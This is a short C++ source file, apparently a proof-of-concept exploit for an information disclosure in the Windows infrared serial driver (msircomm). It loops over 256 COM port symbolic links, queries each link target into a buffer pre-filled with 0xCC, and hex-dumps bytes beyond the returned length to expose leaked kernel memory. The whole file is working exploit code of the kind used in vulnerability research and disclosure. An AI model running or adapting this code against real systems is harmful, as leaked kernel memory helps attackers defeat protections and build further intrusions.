// MSIRCOMM_POC.cpp : Defines the entry point for the console application.
//


#include "stdafx.h"
#include "windows.h"
#include "Header.h"


void POC_MSIRCOMM_Disclosure(ulong PortNumber)
{
	wchar_t wPortNumber[0x10]={0};
	_ultow(PortNumber,wPortNumber,10);
	wchar_t* SymName_Base = L"\\GLOBAL??\\COM";
	wchar_t SymName[0x100]={0};
	wcscat(SymName,SymName_Base);
	wcscat(SymName,wPortNumber);
	wprintf(L"Testing %s\r\n",SymName);
	_UNICODE_STRING UNI_SL = {0};		
	UNI_SL.Length=wcslen(SymName)*2;
	UNI_SL.MaxLength= UNI_SL.Length + 2;
	UNI_SL.Buffer=SymName;
	_OBJECT_ATTRIBUTES ObjAttr_SL = {sizeof(ObjAttr_SL)};
	ObjAttr_SL.ObjectName=&UNI_SL;
	ObjAttr_SL.Attributes=0x40;
	HANDLE hSym = 0;
	int ret = ZwOpenSymbolicLinkObject(&hSym,GENERIC_READ,&ObjAttr_SL);
	printf("ZwOpenSymbolicLinkObject, ret: %X\r\n",ret);
	if(ret >= 0)
	{
		wchar_t* pTarget = (wchar_t*)LocalAlloc(LMEM_ZEROINIT,MAX_UNICODE_STRING_LENGTH);
		if(!pTarget)
		{
			printf("Error allocating memory for target name\r\n");
		}
		else
		{
			memset(pTarget,0xCC,MAX_UNICODE_STRING_LENGTH);
			_UNICODE_STRING uniTarget = {0};
			uniTarget.Length = MAX_UNICODE_STRING_LENGTH - 2;
			uniTarget.MaxLength = MAX_UNICODE_STRING_LENGTH;
			uniTarget.Buffer = pTarget;

			ulong RetLength = 0;
			ret = ZwQuerySymbolicLinkObject(hSym,&uniTarget,&RetLength);
			printf("ZwQuerySymbolicLinkObject, ret: %X\r\n",ret);
			if(ret >= 0)
			{
					printf("Length: %X\r\n",uniTarget.Length);
					printf("MaxLength: %X\r\n",RetLength);

					DumpHex(pTarget,RetLength+0x4);
			}
			LocalFree(pTarget);
		}
		ZwClose(hSym);
	}
	return;
}

int _tmain(int argc, _TCHAR* argv[])
{
	//Please make sure, an IR device is listed under "Infrared Devices" in windows device manager
	//testing 256 COM Ports
	for(ulong i=0;i<=0xFF;i++)
	{
		POC_MSIRCOMM_Disclosure(i + 1);
	}
	return 0;
}

